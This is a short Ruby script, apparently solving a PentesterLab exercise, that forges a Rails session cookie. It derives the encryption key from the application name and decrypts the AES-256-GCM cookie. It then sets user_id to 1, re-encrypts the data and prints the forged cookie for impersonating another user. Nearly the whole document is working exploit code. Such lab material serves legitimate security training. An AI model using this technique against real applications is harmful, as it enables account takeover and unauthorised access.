# sudo docker run -it -v `pwd`:/code ruby:2.4.4 /bin/bash
# Name of app PentesterLab

require 'uri'

cookie = URI.decode "OLvzJJB%2FVZnR74CNYkXzbpmjd1gkcezUIP8BWPyqfaIpG4T%2BrW%2F1mzSZXINISzTQCgwT2%2BRVgNXyhP8%2FOo%2Bo9rjLEUhLuUdBTYcjU7Bc9imq1xz9oyVaERy54AhxFDmSIJtODvE%2B7H%2BEEhCj1%2Bjk3wwbGLrJykBxk%2BY%3D--QTLXsRzT99udLJiM--L6ldf6wYv3SejzulcBsxvQ%3D%3D"
require 'openssl'
require 'base64'

def secret
    secret = Digest::MD5.hexdigest("PentesterLab::Application")
    OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end

cipher = OpenSSL::Cipher.new("aes-256-gcm")

encrypted_data, iv, auth_tag = cookie.split("--").map { |v| ::Base64.strict_decode64(v) }
cipher.decrypt
cipher.key = secret
cipher.iv  = iv
cipher.auth_tag = auth_tag
cipher.auth_data = ""

decrypted_data = cipher.update(encrypted_data)
decrypted_data << cipher.final
puts decrypted_data # let you see what to change e.g user_id
require 'json'
data = JSON.parse decrypted_data
data['user_id']=1

puts data
cipher = OpenSSL::Cipher.new("aes-256-gcm")
cipher.encrypt
cipher.key = secret

# Rely on OpenSSL for the initialization vector
iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

blob = "#{::Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
blob = "#{blob}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts URI.escape(blob,"=/+")
